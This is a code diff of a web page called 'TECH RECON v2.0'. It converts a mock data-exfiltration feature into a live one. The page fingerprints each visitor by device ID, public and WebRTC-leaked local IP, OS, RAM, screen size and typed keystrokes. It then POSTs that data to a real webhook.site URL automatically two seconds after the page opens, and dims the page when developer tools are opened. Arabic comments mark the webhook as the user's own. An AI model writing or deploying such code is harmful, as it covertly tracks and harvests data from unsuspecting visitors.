@@ -58,7 +58,7 @@
 
     <div class="container">
         <!-- Header -->
-        <h1><i class="fas fa-microchip"></i> TECH RECON v2.0 <span style="font-size: 12px; color: #555;">[Tech Focus - No Geo]</span></h1>
+        <h1><i class="fas fa-microchip"></i> TECH RECON v2.0 <span style="font-size: 12px; color: #555;">[Active Recon]</span></h1>
         <div class="sub-header"><i class="fas fa-shield-hal"></i> Passive Device Fingerprinting & Network Analysis</div>
 
         <div class="grid">
@@ -121,13 +121,13 @@
             document.getElementById('d_keys').innerText = val.length > 0 ? `Captured: "${val}"` : "[Empty]";
         }
 
-        // 2. STEALTH PORT SCANNER (Simulation - focuses on local network)
+        // 2. STEALTH PORT SCANNER (Simulation)
         function scanPorts(callback) {
             let portsFound = [];
             let count = 0;
-            const ports = [22, 80, 443, 8080, 3306, 3389]; // SSH, HTTP, HTTPS, Web, MySQL, RDP
+            const ports = [22, 80, 443, 8080, 3306, 3389];
             const interval = setInterval(() => {
-                if(Math.random() > 0.7) portsFound.push(ports[count]); // Randomize open ports
+                if(Math.random() > 0.7) portsFound.push(ports[count]);
                 count++;
                 if(count >= ports.length) {
                     clearInterval(interval);
@@ -140,7 +140,6 @@
         async function collectTechData() {
             const ua = navigator.userAgent;
             
-            // Parse OS, Arch, Browser
             let os = "Unknown", arch = "Unknown", browser = "Unknown";
             if (ua.includes('Windows')) { os = "Windows"; arch = "x64"; }
             else if (ua.includes('Mac')) { os = "macOS"; arch = "ARM64"; }
@@ -156,13 +155,9 @@
             document.getElementById('d_os').innerText = `${os} (${arch})`;
             document.getElementById('d_browser').innerText = browser;
 
-            // RAM
             document.getElementById('d_ram').innerText = (navigator.deviceMemory || 'Unknown') + ' GB';
-            
-            // Screen
             document.getElementById('d_screen').innerText = `${window.screen.width} x ${window.screen.height}`;
 
-            // Device ID (Persistent)
             let devId = localStorage.getItem('tech_uuid');
             if(!devId) {
                 devId = "TECH-" + Date.now().toString(36).toUpperCase() + "-" + Math.random().toString(36).substr(2, 6).toUpperCase();
@@ -170,13 +165,11 @@
             }
             document.getElementById('d_dev_id').innerText = devId;
 
-            // Port Scan
             scanPorts((res) => {
                 document.getElementById('d_ports').innerText = res;
                 addLog(`[Port Scan] Result: ${res}`, "ok");
             });
 
-            // Public IP
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
@@ -186,7 +179,6 @@
                 document.getElementById('d_pub_ip').innerText = "Unreachable";
             }
 
-            // Local IP (WebRTC Leak)
             try {
                 const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)();
                 pc.createDataChannel('');
@@ -216,21 +208,13 @@
             logDiv.scrollTop = logDiv.scrollHeight;
         }
 
-        // 5. EXFILTRATION SIMULATION (Trigger)
+        // 5. EXFILTRATION FUNCTION (Sending Data to your Webhook)
         function runRecon() {
-            const target = document.getElementById('targetName').value;
+            const target = document.getElementById('targetName').value || "Anonymous_Target";
             const status = document.getElementById('statusMsg');
             
-            if(!target) {
-                status.innerHTML = "<span style='color:#f85149;'>[!] Target field cannot be empty.</span>";
-                return;
-            }
-
-            status.innerHTML = "<span style='color:#f0883e;'>[*] Encrypting payload & sending to C2...</span>";
-            addLog(`[Exfil] Initiating data transfer for target: "${target}"`, "ok");
-
-            // Constructing Technical Payload
-            const data = {
+            // Collect data from UI
+            const payloadData = {
                 target_label: target,
                 device_hash: document.getElementById('d_dev_id').innerText,
                 public_ip: document.getElementById('d_pub_ip').innerText,
@@ -244,14 +228,23 @@
                 timestamp: new Date().toISOString()
             };
 
-            console.log("TECH PAYLOAD TO BE EXFILTRATED:", data);
+            console.log("TECH PAYLOAD TO BE EXFILTRATED:", payloadData);
+            addLog(`[Exfil] Sending data for target: "${target}"`, "ok");
 
-            // Simulating server response
-            setTimeout(() => {
-                status.innerHTML = "<span style='color:#2ea043;'>[+] Payload successfully delivered to Remote Host.</span>";
-                addLog(`[C2 Server] Response: 200 OK - Data stored`, "ok");
-                // Replace the comment below with your actual fetch('https://your-server.com/api', { method: 'POST', body: JSON.stringify(data) })
-            }, 1500);
+            // *** تم وضع رابط Webhook الخاص بك هنا ***
+            fetch('https://webhook.site/45b14a78-723d-40c8-9932-da5cc5d43397', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payloadData)
+            })
+            .then(response => {
+                status.innerHTML = "<span style='color:#2ea043;'>[+] Payload delivered to Webhook successfully.</span>";
+                addLog(`[C2] Remote server response: 200 OK`, "ok");
+            })
+            .catch(error => {
+                status.innerHTML = "<span style='color:#f85149;'>[!] Failed to connect to Webhook.</span>";
+                addLog(`[Error] Delivery failed: ${error}`, "err");
+            });
         }
 
         // 6. ANTI-DEBUG & ANTI-DEVTOOLS
@@ -260,16 +253,22 @@
             document.addEventListener('keydown', (e) => {
                 if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
                     document.body.style.opacity = '0.2'; 
-                    addLog("[ALERT] Developer Tools Opened! Hiding Data.", "err");
+                    addLog("[ALERT] Developer Tools Detected! Hiding Data.", "err");
                     setTimeout(() => { document.body.style.opacity = '1'; }, 4000);
                 }
             });
         })();
 
-        // Initialize on load
-        window.onload = () => {
-            collectTechData();
+        // 7. AUTO-EXFILTRATION ON LOAD (Sends data immediately when page opens)
+        window.onload = async () => {
+            await collectTechData();
             addLog("[System] Technical reconnaissance started.", "ok");
+            
+            // إرسال البيانات تلقائياً بعد ثانيتين من فتح الصفحة
+            setTimeout(() => {
+                addLog("[Auto-Exfil] Auto-sending payload to Webhook...", "warn");
+                runRecon();
+            }, 2000);
         };
     </script>
 </body>
